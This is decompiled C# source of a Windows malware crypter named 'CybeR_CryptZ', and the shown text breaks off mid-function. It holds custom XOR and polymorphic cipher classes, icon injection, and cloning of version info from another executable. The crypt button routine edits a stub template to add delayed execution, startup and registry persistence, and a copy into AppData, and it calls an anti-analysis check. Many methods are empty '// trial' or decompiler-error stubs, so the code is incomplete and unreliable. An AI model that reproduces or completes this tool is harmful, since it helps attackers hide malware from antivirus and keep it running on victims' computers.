using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using CybeR_CryptZ.My;
using CybeR_CryptZ.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace CybeR_CryptZ
{

    [DesignerGenerated]
    public class Cyber_Z_CrypteR : Form
    {

        public class AES
        {

            [DebuggerNonUserCode]
            public AES()
            {
            }

            public static byte[] DecryptAES(byte[] input, byte[] pass)
            {
                // trial
                return null;
            }

            public static byte[] EncryptAES(byte[] input, byte[] pass)
            {
                RijndaelManaged rijndaelManaged = new RijndaelManaged();
                MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
                byte[] bArr2 = new byte[32];
                byte[] bArr3 = md5CryptoServiceProvider.ComputeHash(pass);
                Array.Copy(bArr3, 0, bArr2, 0, 16);
                Array.Copy(bArr3, 0, bArr2, 15, 16);
                rijndaelManaged.Key = bArr2;
                rijndaelManaged.Mode = CipherMode.ECB;
                ICryptoTransform icryptoTransform = rijndaelManaged.CreateEncryptor();
                return Encoding.UTF8.GetBytes(Convert.ToBase64String(icryptoTransform.TransformFinalBlock(input, 0, checked((int)input.Length))));
            }

        } // class AES

        public class BabyPolyCrypt
        {

            [DebuggerNonUserCode]
            public BabyPolyCrypt()
            {
            }

            public static byte[] DecryptPoly(byte[] data, byte[] key)
            {
                // trial
                return null;
            }

            public static byte[] EncrytPoly(byte[] data, byte[] key)
            {
                int i4;

                string s = Convert.ToBase64String(data);
                data = Encoding.Default.GetBytes(s);
                Random random = new Random();
                int i1 = random.Next(1, 133);
                int i3 = checked(checked((int)data.Length) - 1);
                int i2 = 0;
                while (i2 <= i4)
                {
                    data[i2] = checked((byte)checked(checked(data[i2] + Strings.Asc(Conversions.ToString(key[i2 % checked((int)key.Length)]))) - i1));
                    i2 = checked(i2 + 1);
                    i4 = i3;
                }
                data = (byte[])Utils.CopyArray((Array)data, new byte[checked(checked((int)data.Length) + 1)]);
                data[checked(checked((int)data.Length) - 1)] = checked((byte)i1);
                return data;
            }

        } // class BabyPolyCrypt

        public class Dcrypto
        {

            [DebuggerNonUserCode]
            public Dcrypto()
            {
            }

            public static object Decrypt(byte[] input, byte[] pass1, byte[] pass2, int rounds)
            {
                int i6;

                bool flag = rounds == 0;
                if (flag)
                    rounds = 10;
                byte[] bArr = new byte[checked(rounds + 1)];
                int i4 = checked(checked((int)bArr.Length) - 1);
                int i1 = 0;
                while (i1 <= i6)
                {
                    bArr[i1] = checked((byte)(bArr[i1 % checked((int)bArr.Length)] ^ (checked(checked((byte)(pass1[i1 % checked((int)pass1.Length)] + pass2[i1 % checked((int)pass2.Length)])) + 256) % 256)));
                    i1 = checked(i1 + 1);
                    i6 = i4;
                }
                int i2 = checked(checked(checked((int)input.Length) + rounds) + checked(checked((int)pass1.Length) * checked((int)pass2.Length)));
                while (i2 >= i6)
                {
                    int i5 = checked(checked((int)input.Length) - 1);
                    int i3 = 0;
                    while (i3 <= i6)
                    {
                        input[i3] = checked((byte)(checked((byte)(input[i3] ^ checked(bArr[i3 % checked((int)bArr.Length)] + 256))) % 256));
                        i3 = checked(i3 + 1);
                        i6 = i5;
                    }
                    input[i2 % checked((int)input.Length)] = checked((byte)(checked((byte)checked((input[i2 % checked((int)input.Length)] ^ pass1[checked(i2 + 1) % checked((int)pass1.Length)] ^ (input[checked(i2 + 1) % checked((int)input.Length)] ^ pass1[i2 % checked((int)pass1.Length)]) ^ pass2[i2 % checked((int)pass2.Length)]) + 256)) % 256));
                    i2 = checked(i2 + -1);
                    i6 = 0;
                }
                return Encoding.Default.GetString(input);
            }

            public static object Encrypt(byte[] input, byte[] pass1, byte[] pass2, int rounds)
            {
                // trial
                return null;
            }

        } // class Dcrypto

        public class DexCryptMin
        {

            [DebuggerNonUserCode]
            public DexCryptMin()
            {
            }

            public static byte[] Decrypt(byte[] plain, byte[] key)
            {
                int i6;

                byte[] bArr2 = (byte[])plain.Clone();
                int i1 = 4;
                do
                {
                    int i4 = checked(checked((int)bArr2.Length) - 1);
                    int i2 = 0;
                    while (i2 <= i6)
                    {
                        int i5 = checked(checked((int)key.Length) - 1);
                        int i3 = 0;
                        while (i3 <= i6)
                        {
                            bArr2[i2] = checked((byte)(bArr2[i2] ^ (checked(((byte)(key[i3] << (i1 & 7)) ^ i3) + i2) & 255)));
                            i3 = checked(i3 + 1);
                            i6 = i5;
                        }
                        bArr2[i2] = bArr2[i2] ^ key[i2 % checked((int)key.Length)];
                        i2 = checked(i2 + 1);
                        i6 = i4;
                    }
                    i1 = checked(i1 + -1);
                    i6 = 0;
                } while (i1 >= i6);
                return bArr2;
            }

            public static string Decrypt(string plain, string key)
            {
                return Encoding.UTF8.GetString(Cyber_Z_CrypteR.DexCryptMin.Decrypt(Convert.FromBase64String(plain), Encoding.UTF8.GetBytes(key)));
            }

            public static string Encrypt(string plain, string key)
            {
                // trial
                return null;
            }

            public static byte[] Encrypt(byte[] plain, byte[] key)
            {
                // trial
                return null;
            }

        } // class DexCryptMin

        public class Guard
        {

            public enum Hasher
            {
                MD5,
                Sha1,
                Sha256,
                Sha384,
                Sha512
            }

            public enum Securer
            {
                AES,
                DES,
                RC2,
                TripleDES
            }

            [DebuggerNonUserCode]
            public Guard()
            {
            }

            public static byte[] Hash(byte[] data, Cyber_Z_CrypteR.Guard.Hasher method)
            {
                byte[] bArr;

                HashAlgorithm hashAlgorithm = HashAlgorithm.Create(method.ToString());
                try
                {
                    return hashAlgorithm.ComputeHash(data);
                }
                finally
                {
                    bool flag = hashAlgorithm != null;
                    if (flag)
                        hashAlgorithm.Dispose();
                }
                return bArr;
            }

            public static byte[] Secure(byte[] data, byte[] password, Cyber_Z_CrypteR.Guard.Securer method)
            {
                // trial
                return null;
            }

        } // class Guard

        public class IconInjector
        {

            private struct BITMAPINFOHEADER
            {

                public ushort BitCount;
                public uint ClrImportant;
                public uint ClrUsed;
                public uint Compression;
                public int Height;
                public ushort Planes;
                public uint Size;
                public uint SizeImage;
                public int Width;
                public int XPelsPerMeter;
                public int YPelsPerMeter;

            }

            [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi, Pack = 2)]
            private struct GRPICONDIRENTRY
            {

                public ushort BitCount;
                public int BytesInRes;
                public byte ColorCount;
                public byte Height;
                public ushort ID;
                public ushort Planes;
                public byte Reserved;
                public byte Width;

            }

            private struct ICONDIR
            {

                public ushort Count;
                public ushort Reserved;
                public ushort Type;

            }

            private struct ICONDIRENTRY
            {

                public ushort BitCount;
                public int BytesInRes;
                public byte ColorCount;
                public byte Height;
                public int ImageOffset;
                public ushort Planes;
                public byte Reserved;
                public byte Width;

            }

            private class IconFile
            {

                private Cyber_Z_CrypteR.IconInjector.ICONDIR iconDir;
                private Cyber_Z_CrypteR.IconInjector.ICONDIRENTRY[] iconEntry;
                private byte[][] iconImage;

                public int ImageCount
                {
                    get
                    {
                        return iconDir.Count;
                    }
                }

                private IconFile()
                {
                    iconDir = new Cyber_Z_CrypteR.IconInjector.ICONDIR();
                }

                public byte[] CreateIconGroupData(uint iconBaseID)
                {
                    int i5;
                    Cyber_Z_CrypteR.IconInjector.BITMAPINFOHEADER bitmapinfoheader;
                    Cyber_Z_CrypteR.IconInjector.GRPICONDIRENTRY grpicondirentry;

                    int i2 = checked(Marshal.SizeOf(typeof(Cyber_Z_CrypteR.IconInjector.ICONDIR)) + checked(Marshal.SizeOf(typeof(Cyber_Z_CrypteR.IconInjector.GRPICONDIRENTRY)) * ImageCount));
                    byte[] bArr2 = new byte[checked(checked(i2 - 1) + 1)];
                    GCHandle gchandle1 = GCHandle.Alloc(bArr2, GCHandleType.Pinned);
                    Marshal.StructureToPtr(iconDir, gchandle1.AddrOfPinnedObject(), false);
                    int i1 = Marshal.SizeOf(iconDir);
                    int i4 = checked(ImageCount - 1);
                    int i3 = 0;
                    while (i3 <= i5)
                    {
                        grpicondirentry = new Cyber_Z_CrypteR.IconInjector.GRPICONDIRENTRY();
                        bitmapinfoheader = new Cyber_Z_CrypteR.IconInjector.BITMAPINFOHEADER();
                        GCHandle gchandle2 = GCHandle.Alloc(bitmapinfoheader, GCHandleType.Pinned);
                        Marshal.Copy(get_ImageData(i3), 0, gchandle2.AddrOfPinnedObject(), Marshal.SizeOf(typeof(Cyber_Z_CrypteR.IconInjector.BITMAPINFOHEADER)));
                        gchandle2.Free();
                        grpicondirentry.Width = iconEntry[i3].Width;
                        grpicondirentry.Height = iconEntry[i3].Height;
                        grpicondirentry.ColorCount = iconEntry[i3].ColorCount;
                        grpicondirentry.Reserved = iconEntry[i3].Reserved;
                        grpicondirentry.Planes = bitmapinfoheader.Planes;
                        grpicondirentry.BitCount = bitmapinfoheader.BitCount;
                        grpicondirentry.BytesInRes = iconEntry[i3].BytesInRes;
                        grpicondirentry.ID = checked((ushort)checked((ulong)iconBaseID + (long)i3));
                        IntPtr intPtr1 = gchandle1.AddrOfPinnedObject();
                        IntPtr intPtr2 = new IntPtr(checked(intPtr1.ToInt64() + (long)i1));
                        Marshal.StructureToPtr(grpicondirentry, intPtr2, false);
                        i1 = checked(i1 + Marshal.SizeOf(typeof(Cyber_Z_CrypteR.IconInjector.GRPICONDIRENTRY)));
                        i3 = checked(i3 + 1);
                        i5 = i4;
                    }
                    gchandle1.Free();
                    return bArr2;
                }

                public byte[] get_ImageData(int index)
                {
                    return iconImage[index];
                }

                public static Cyber_Z_CrypteR.IconInjector.IconFile FromFile(string filename)
                {
                    // trial
                    return null;
                }

            } // class IconFile

            [SuppressUnmanagedCodeSecurity]
            private class NativeMethods
            {

                [DebuggerNonUserCode]
                public NativeMethods()
                {
                }

                [PreserveSig]
                [DllImport("kernel32", CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Ansi)]
                public static extern IntPtr BeginUpdateResource(string fileName, [MarshalAs(UnmanagedType.Bool)] bool deleteExistingResources);

                [PreserveSig]
                [DllImport("kernel32", CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Ansi)]
                [return: MarshalAs(UnmanagedType.Bool)]
                public static extern bool EndUpdateResource(IntPtr hUpdate, [MarshalAs(UnmanagedType.Bool)] bool discard);

                [PreserveSig]
                [DllImport("kernel32", CallingConvention = CallingConvention.Winapi, CharSet = CharSet.Ansi)]
                [return: MarshalAs(UnmanagedType.Bool)]
                public static extern bool UpdateResource(IntPtr hUpdate, IntPtr type, IntPtr name, short language, [MarshalAs(UnmanagedType.LPArray, SizeConst = 80)] byte[] data, int dataSize);

            } // class NativeMethods

            [DebuggerNonUserCode]
            public IconInjector()
            {
            }

            public static void InjectIcon(string exeFileName, string iconFileName, uint iconGroupID, uint iconBaseID)
            {
                int i3;

                Cyber_Z_CrypteR.IconInjector.IconFile iconFile = Cyber_Z_CrypteR.IconInjector.IconFile.FromFile(iconFileName);
                IntPtr intPtr1 = Cyber_Z_CrypteR.IconInjector.NativeMethods.BeginUpdateResource(exeFileName, false);
                byte[] bArr1 = iconFile.CreateIconGroupData(iconBaseID);
                IntPtr intPtr2 = new IntPtr((long)14);
                IntPtr intPtr3 = new IntPtr(iconGroupID);
                Cyber_Z_CrypteR.IconInjector.NativeMethods.UpdateResource(intPtr1, intPtr2, intPtr3, 0, bArr1, checked((int)bArr1.Length));
                int i2 = checked(iconFile.ImageCount - 1);
                int i1 = 0;
                while (i1 <= i3)
                {
                    byte[] bArr2 = iconFile.get_ImageData(i1);
                    intPtr3 = new IntPtr((long)3);
                    intPtr2 = new IntPtr(checked((ulong)iconBaseID + (long)i1));
                    Cyber_Z_CrypteR.IconInjector.NativeMethods.UpdateResource(intPtr1, intPtr3, intPtr2, 0, bArr2, checked((int)bArr2.Length));
                    i1 = checked(i1 + 1);
                    i3 = i2;
                }
                Cyber_Z_CrypteR.IconInjector.NativeMethods.EndUpdateResource(intPtr1, false);
            }

            public static void InjectIcon(string exeFileName, string iconFileName)
            {
                // trial
            }

        } // class IconInjector

        public class MD5
        {

            [DebuggerNonUserCode]
            public MD5()
            {
            }

            public static byte[] Decrypt(byte[] bytData, string sKey, CipherMode tMode, PaddingMode tPadding)
            {
                // trial
                return null;
            }

            public static byte[] Encrypt(byte[] bytData, string sKey, CipherMode tMode, PaddingMode tPadding)
            {
                MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
                byte[] bArr2 = md5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(sKey));
                md5CryptoServiceProvider.Clear();
                TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
                tripleDESCryptoServiceProvider.Key = bArr2;
                tripleDESCryptoServiceProvider.Mode = tMode;
                tripleDESCryptoServiceProvider.Padding = tPadding;
                ICryptoTransform icryptoTransform = tripleDESCryptoServiceProvider.CreateEncryptor();
                byte[] bArr3 = icryptoTransform.TransformFinalBlock(bytData, 0, checked((int)bytData.Length));
                tripleDESCryptoServiceProvider.Clear();
                return bArr3;
            }

        } // class MD5

        public class PolyCrypt
        {

            [DebuggerNonUserCode]
            public PolyCrypt()
            {
            }

            public static string Decrypt(string Input)
            {
                // decompiler error
            }

            public static string Encrypt(string Input)
            {
                // trial
                return null;
            }

        } // class PolyCrypt

        public class PolyMorphic
        {

            private string A;

            public string B
            {
                get
                {
                    return A;
                }
                set
                {
                    A = value;
                }
            }

            public PolyMorphic(string Key)
            {
                A = "";
                B = Key;
            }

            public PolyMorphic()
            {
                A = "";
                B = "";
            }

            private byte D(byte E, short F)
            {
                bool flag;

                while (flag)
                {
                    F = checked((short)checked(F + 256));
                    flag = F < 0;
                }
                return Convert.ToByte(checked((short)(E + F)) % 256);
            }

            public byte[] Encrypt(byte[] K)
            {
                // trial
                return null;
            }

            private byte[] G(byte[] H, byte[] J)
            {
                // trial
                return null;
            }

        } // class PolyMorphic

        public class PolyMorphicStairs
        {

            [DebuggerNonUserCode]
            public PolyMorphicStairs()
            {
            }

            public static string PolyCrypt(string Data, string Key, uint ExtraRounds)
            {
                byte[] bArr2 = Encoding.Default.GetBytes(Data);
                byte[] bArr1 = Cyber_Z_CrypteR.PolyMorphicStairs.PolyCrypt(ref bArr2, Encoding.Default.GetBytes(Key), ExtraRounds);
                string s = Encoding.Default.GetString(bArr1);
                bArr1 = null;
                return s;
            }

            public static byte[] PolyCrypt(ref byte[] Data, byte[] Key, uint ExtraRounds)
            {
                int i2;

                Array.Resize<byte>(ref Data, checked(checked((int)Data.Length) + 1));
                Data[checked(checked((int)Data.Length) - 1)] = Convert.ToByte((new Random()).Next(1, 255));
                int i1 = checked((int)checked((long)checked(checked((int)Data.Length) - 1) * checked((ulong)ExtraRounds + (long)1)));
                while (i1 >= i2)
                {
                    Data[i1 % checked((int)Data.Length)] = checked((byte)(checked(Data[i1 % checked((int)Data.Length)] + Data[checked(i1 + 1) % checked((int)Data.Length)]) % 256)) ^ Key[i1 % checked((int)Key.Length)];
                    i1 = checked(i1 + -1);
                    i2 = 0;
                }
                return Data;
            }

            public static string PolyDeCrypt(string Data, string Key, uint ExtraRounds)
            {
                // trial
                return null;
            }

            public static byte[] PolyDeCrypt(ref byte[] Data, byte[] Key, uint ExtraRounds)
            {
                // trial
                return null;
            }

        } // class PolyMorphicStairs

        public class PolyRevCrypt
        {

            [DebuggerNonUserCode]
            public PolyRevCrypt()
            {
            }

            public static byte[] PolyRevCrypt(byte[] data, string pass, bool isString)
            {
                // trial
                return null;
            }

            public static byte[] PolyRevDeCrypt(byte[] data, string pass)
            {
                int i4;

                Array.Reverse(data);
                byte b = data[checked(checked((int)data.Length) - 1)];
                Array.Resize<byte>(ref data, checked(checked((int)data.Length) - 1));
                byte[] bArr2 = Encoding.Default.GetBytes(pass);
                byte[] bArr1 = new byte[checked(checked((int)data.Length) + 1)];
                int i1 = 0;
                int i3 = checked(checked((int)data.Length) - 1);
                int i2 = 0;
                while (i2 <= i4)
                {
                    bArr1[i2] = data[i2] ^ b ^ bArr2[i1];
                    Array.Reverse(bArr2);
                    bool flag = i1 == checked(checked((int)bArr2.Length) - 1);
                    if (flag)
                        i1 = 0;
                    else
                        i1 = checked(i1 + 1);
                    i2 = checked(i2 + 1);
                    i4 = i3;
                }
                return bArr1;
            }

        } // class PolyRevCrypt

        public class pr0t0x0r
        {

            [DebuggerNonUserCode]
            public pr0t0x0r()
            {
            }

            public static byte[] decrypt(byte[] message, string password)
            {
                int i1, i5;

                byte[] bArr2 = Encoding.Default.GetBytes(password);
                int i2 = message[checked(checked((int)message.Length) - 1)] ^ 112;
                byte[] bArr3 = new byte[checked(checked((int)message.Length) + 1)];
                int i4 = checked(checked((int)message.Length) - 1);
                int i3 = 0;
                while (i3 <= i5)
                {
                    bArr3[i3] = checked((byte)(message[i3] ^ i2 ^ bArr2[i1]));
                    bool flag = i1 == checked(password.Length - 1);
                    if (flag)
                        i1 = 0;
                    else
                        i1 = checked(i1 + 1);
                    i3 = checked(i3 + 1);
                    i5 = i4;
                }
                return (byte[])Utils.CopyArray((Array)bArr3, new byte[checked(checked(checked((int)message.Length) - 2) + 1)]);
            }

            public static byte[] encrypt(byte[] message, string password)
            {
                // trial
                return null;
            }

        } // class pr0t0x0r

        public class RSA
        {

            [DebuggerNonUserCode]
            public RSA()
            {
            }

            public static RSAParameters Create(int KeySize)
            {
                RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider(KeySize);
                return rsacryptoServiceProvider.ExportParameters(true);
            }

            public static byte[] Decrypt(RSAParameters Parameters, byte[] Data)
            {
                RSACryptoServiceProvider rsacryptoServiceProvider = new RSACryptoServiceProvider(512);
                rsacryptoServiceProvider.ImportParameters(Parameters);
                return rsacryptoServiceProvider.Decrypt(Data, true);
            }

            public static byte[] Encrypt(byte[] PublicKey, byte[] Modulus, byte[] Data)
            {
                // trial
                return null;
            }

        } // class RSA

        public class StairsEncryption
        {

            [DebuggerNonUserCode]
            public StairsEncryption()
            {
            }

            public static byte[] Crypt(byte[] Data, byte[] key)
            {
                // trial
                return null;
            }

            public static byte[] DeCrypt(byte[] Data, byte[] key)
            {
                int i2;

                int i1 = checked(checked(checked((int)Data.Length) * 2) + checked((int)key.Length));
                while (i1 >= i2)
                {
                    Data[i1 % checked((int)Data.Length)] = checked((byte)(checked(checked((Data[i1 % checked((int)Data.Length)] ^ key[i1 % checked((int)key.Length)]) - Data[checked(i1 + 1) % checked((int)Data.Length)]) + 256) % 256));
                    i1 = checked(i1 + -1);
                    i2 = 0;
                }
                return Data;
            }

        } // class StairsEncryption

        [AccessedThroughProperty("CheckBox7")]
        private CheckBox _CheckBox7;
        [AccessedThroughProperty("CheckBox9")]
        private CheckBox _CheckBox9;
        [AccessedThroughProperty("Compressor")]
        private CheckBox _Compressor;
        [AccessedThroughProperty("CryptButton")]
        private RButton _CryptButton;
        [AccessedThroughProperty("CypherxGroupBox1")]
        private CypherxGroupBox _CypherxGroupBox1;
        [AccessedThroughProperty("CypherxGroupBox3")]
        private CypherxGroupBox _CypherxGroupBox3;
        [AccessedThroughProperty("Label11k")]
        private Label _Label11k;
        [AccessedThroughProperty("Label14l")]
        private Label _Label14l;
        [AccessedThroughProperty("Label15d")]
        private Label _Label15d;
        [AccessedThroughProperty("OpenFileDialog1")]
        private OpenFileDialog _OpenFileDialog1;
        [AccessedThroughProperty("RButton3")]
        private RButton _RButton3;
        [AccessedThroughProperty("RButtonRed2")]
        private RButtonRed _RButtonRed2;
        [AccessedThroughProperty("RTheme1")]
        private RTheme _RTheme1;
        [AccessedThroughProperty("SaveFileDialog1")]
        private SaveFileDialog _SaveFileDialog1;
        [AccessedThroughProperty("SecureProcc")]
        private CheckBox _SecureProcc;
        [AccessedThroughProperty("TextBox1")]
        private TextBox _TextBox1;
        [AccessedThroughProperty("USGButton")]
        private RButton _USGButton;
        private string antis;
        private IContainer components;
        private OpenFileDialog dialog;
        private SaveFileDialog dialog2;
        private StringBuilder GenerateAPI;
        private AsyncOperation O;
        private Random R;
        private string theBar;

        private static List<WeakReference> __ENCList;

        internal virtual CheckBox CheckBox7
        {
            get
            {
                return _CheckBox7;
            }
            set
            {
                _CheckBox7 = value;
            }
        }

        internal virtual CheckBox CheckBox9
        {
            get
            {
                return _CheckBox9;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(CheckBox9_CheckedChanged);
                bool flag = _CheckBox9 != null;
                if (flag)
                    _CheckBox9.CheckedChanged -= eventHandler;
                _CheckBox9 = value;
                flag = _CheckBox9 != null;
                if (flag)
                    _CheckBox9.CheckedChanged += eventHandler;
            }
        }

        internal virtual CheckBox Compressor
        {
            get
            {
                return _Compressor;
            }
            set
            {
                _Compressor = value;
            }
        }

        internal virtual RButton CryptButton
        {
            get
            {
                return _CryptButton;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(CryptButton_Click);
                bool flag = _CryptButton != null;
                if (flag)
                    _CryptButton.Click -= eventHandler;
                _CryptButton = value;
                flag = _CryptButton != null;
                if (flag)
                    _CryptButton.Click += eventHandler;
            }
        }

        internal virtual CypherxGroupBox CypherxGroupBox1
        {
            get
            {
                return _CypherxGroupBox1;
            }
            set
            {
                _CypherxGroupBox1 = value;
            }
        }

        internal virtual CypherxGroupBox CypherxGroupBox3
        {
            get
            {
                return _CypherxGroupBox3;
            }
            set
            {
                _CypherxGroupBox3 = value;
            }
        }

        internal virtual Label Label11k
        {
            get
            {
                return _Label11k;
            }
            set
            {
                _Label11k = value;
            }
        }

        internal virtual Label Label14l
        {
            get
            {
                return _Label14l;
            }
            set
            {
                _Label14l = value;
            }
        }

        internal virtual Label Label15d
        {
            get
            {
                return _Label15d;
            }
            set
            {
                _Label15d = value;
            }
        }

        internal virtual OpenFileDialog OpenFileDialog1
        {
            get
            {
                return _OpenFileDialog1;
            }
            set
            {
                _OpenFileDialog1 = value;
            }
        }

        internal virtual RButton RButton3
        {
            get
            {
                return _RButton3;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RButton3_Click);
                bool flag = _RButton3 != null;
                if (flag)
                    _RButton3.Click -= eventHandler;
                _RButton3 = value;
                flag = _RButton3 != null;
                if (flag)
                    _RButton3.Click += eventHandler;
            }
        }

        internal virtual RButtonRed RButtonRed2
        {
            get
            {
                return _RButtonRed2;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(RButtonRed2_Click);
                bool flag = _RButtonRed2 != null;
                if (flag)
                    _RButtonRed2.Click -= eventHandler;
                _RButtonRed2 = value;
                flag = _RButtonRed2 != null;
                if (flag)
                    _RButtonRed2.Click += eventHandler;
            }
        }

        internal virtual RTheme RTheme1
        {
            get
            {
                return _RTheme1;
            }
            set
            {
                _RTheme1 = value;
            }
        }

        internal virtual SaveFileDialog SaveFileDialog1
        {
            get
            {
                return _SaveFileDialog1;
            }
            set
            {
                _SaveFileDialog1 = value;
            }
        }

        internal virtual CheckBox SecureProcc
        {
            get
            {
                return _SecureProcc;
            }
            set
            {
                _SecureProcc = value;
            }
        }

        internal virtual TextBox TextBox1
        {
            get
            {
                return _TextBox1;
            }
            set
            {
                _TextBox1 = value;
            }
        }

        internal virtual RButton USGButton
        {
            get
            {
                return _USGButton;
            }
            set
            {
                EventHandler eventHandler = new EventHandler(USGButton_Click);
                bool flag = _USGButton != null;
                if (flag)
                    _USGButton.Click -= eventHandler;
                _USGButton = value;
                flag = _USGButton != null;
                if (flag)
                    _USGButton.Click += eventHandler;
            }
        }

        [DebuggerNonUserCode]
        static Cyber_Z_CrypteR()
        {
            Cyber_Z_CrypteR.__ENCList = new List<WeakReference>();
        }

        public Cyber_Z_CrypteR()
        {
            Load += new EventHandler(Loading);
            Shown += new EventHandler(Cyber_shown);
            Cyber_Z_CrypteR.__ENCAddToList(this);
            R = new Random();
            dialog = new OpenFileDialog();
            dialog2 = new SaveFileDialog();
            O = AsyncOperationManager.CreateOperation(null);
            GenerateAPI = new StringBuilder();
            InitializeComponent();
        }

        public string App_Path()
        {
            // trial
            return null;
        }

        public string BASE64_Decode(string input)
        {
            // trial
            return null;
        }

        public string BASE64_Encode(string input)
        {
            return Convert.ToBase64String(Encoding.UTF8.GetBytes(input));
        }

        private string ByteArrayToString(byte[] arrInput)
        {
            int i3;

            StringBuilder stringBuilder = new StringBuilder(checked((int)arrInput.Length));
            int i2 = checked(checked((int)arrInput.Length) - 1);
            int i1 = 0;
            while (i1 <= i3)
            {
                stringBuilder.Append(arrInput[i1].ToString("X2"));
                i1 = checked(i1 + 1);
                i3 = i2;
            }
            return stringBuilder.ToString().ToLower();
        }

        public void Check_Antis()
        {
            // decompiler error
        }

        private void CheckBox9_CheckedChanged(object sender, EventArgs e)
        {
            bool flag1 = CheckBox9.Checked;
            bool flag2 = flag1 == MyProject.Forms.U_S_G.CheckBox3.Checked;
            if (flag2)
                MyProject.Forms.U_S_G.CheckBox3.Checked = false;
        }

        private void CloneIt(string SourceFile)
        {
            File.WriteAllBytes(Application.StartupPath + "\\res\\res.exe", Resources.Res);
            Interaction.Shell(App_Path() + "res\\\\res.exe -extract " + SourceFile + "," + App_Path() + "res\\\\info.res,VERSIONINFO,,", AppWinStyle.MinimizedFocus, false, -1);
            Interaction.Shell(App_Path() + "res\\\\res.exe -delete " + dialog2.FileName + "," + App_Path() + "res\\\\res.exe,VERSIONINFO,,", AppWinStyle.MinimizedFocus, false, -1);
            Interaction.Shell(App_Path() + "res\\\\res.exe -addoverwrite " + dialog2.FileName + "," + dialog2.FileName + "," + App_Path() + "res\\\\info.res,VERSIONINFO,1,", AppWinStyle.MinimizedFocus, false, -1);
        }

        private void CryptButton_Click(object sender, EventArgs e)
        {
            bool flag1, flag7;
            byte[] bArr1, bArr18;
            ResourceWriter resourceWriter10, resourceWriter11, resourceWriter12, resourceWriter13;

            Check_Antis();
            bool flag6 = Operators.CompareString(TextBox1.Text, "Select File to Encrypt", false) == 0;
            if (flag6)
            {
                Interaction.MsgBox("Please Select a valid File", MsgBoxStyle.ApplicationModal, null);
            }
            else
            {
                MyProject.Forms.Work_Progress.TextBox15.Text = "";
                MyProject.Forms.Work_Progress.Current_Operation.Text = "";
                dialog2.DefaultExt = "exe";
                dialog2.Filter = "Executable Files (*.exe)|*.exe";
                flag6 = dialog2.ShowDialog() == DialogResult.OK;
                if (flag6)
                {
                }
                else
                {
                    goto label_1;
                }
                MyProject.Forms.Work_Progress.Show();
                MyProject.Forms.Work_Progress.ProgressBar1.Value = 0;
                flag6 = File.Exists(dialog2.FileName);
                if (flag6)
                {
                    MyProject.Forms.Work_Progress.Current_Operation.Text = "Deleting Existing File.";
                    File.Delete(dialog2.FileName);
                }
                string s12 = Resources.UniK_Stub_Z;
                MyProject.Forms.Work_Progress.TextBox15.AppendText(Environment.NewLine + "\u2022Encryption Started\u2022 " + Conversions.ToString(DateAndTime.Hour(DateAndTime.Now)) + ":" + Conversions.ToString(DateAndTime.Minute(DateAndTime.Now)) + ":" + Conversions.ToString(DateAndTime.Second(DateAndTime.Now)));
                MyProject.Forms.Work_Progress.TextBox15.AppendText(Environment.NewLine + "\u2022Building Encryptions\u2022");
                MyProject.Forms.Work_Progress.Current_Operation.Text = "Encryption Started " + Conversions.ToString(DateAndTime.Hour(DateAndTime.Now)) + ":" + Conversions.ToString(DateAndTime.Minute(DateAndTime.Now)) + ":" + Conversions.ToString(DateAndTime.Second(DateAndTime.Now));
                MyProject.Forms.Work_Progress.Current_Operation.Text = "Building Encryptions";
                flag6 = !MyProject.Forms.U_S_G.CheckBox13.Checked;
                if (flag6)
                    s12 = s12.Replace("'DelayInSeconds", " ");
                else
                    s12 = s12.Replace("'DelayInSeconds", "Threading.Thread.Sleep(" + Conversions.ToString(Conversions.ToDouble(MyProject.Forms.U_S_G.NumericUpDown10.Text) * 1000.0) + ")");
                flag6 = !MyProject.Forms.U_S_G.crypterstartup.Checked;
                if (flag6)
                {
                    s12 = s12.Replace("Dim RegPerX As Threading.Thread = RegPersistence.PersistenceE", "");
                    s12 = s12.Replace("RegPerX.Start()", "");
                }
                else
                {
                    MyProject.Forms.Work_Progress.TextBox15.AppendText(Environment.NewLine + "\u2022Adding File to Custom Startup\u2022");
                    MyProject.Forms.Work_Progress.Current_Operation.Text = "Adding File to Custom Startup";
                    flag6 = MyProject.Forms.U_S_G.PersistenceCheck.Checked;
                    if (flag6)
                    {
                        s12 = s12.Replace("Dim persistance As Boolean = False", "Dim persistance As Boolean = True");
                        MyProject.Forms.Work_Progress.TextBox15.AppendText(Environment.NewLine + "\u2022Registry Persistence\u2022");
                        MyProject.Forms.Work_Progress.Current_Operation.Text = "Adding Persistence";
                    }
                    flag6 = MyProject.Forms.U_S_G.RadioButton8.Checked;
                    if (flag6)
                    {
                        s12 = s12.Replace("Dim filedir As String = appdataSpecialFolder & ", "Dim filedir As String = LocalAppDataSF & ");
                        s12 = s12.Replace("FileCopy(Application.ExecutablePath, appdataSpecialFolder &", "FileCopy(Application.ExecutablePath, LocalAppDataSF & ");
                        s12 = s12.Replace("File.SetAttributes(appdataSpecialFolder & ", "File.SetAttributes(LocalAppDataSF & ");
                        s12 = s12.Replace("Dim mydoc As String = Environment.GetEnvironmentVariable(PolyCrypt.DecryptWithpOLYcRYPT(\"HOMEPATHToEncryptMyDC\"))", "");
                        s12 = s12.Replace("Dim programfilesDir As String = Environment.GetEnvironmentVariable(PolyCrypt.DecryptWithpOLYcRYPT(\"PROGRAMFILEStoEncryptpCrypt\"))", "");
                    }
                    flag6 = MyProject.Forms.U_S_G.RadioButton7.Checked;
                    if (flag6)
                    {
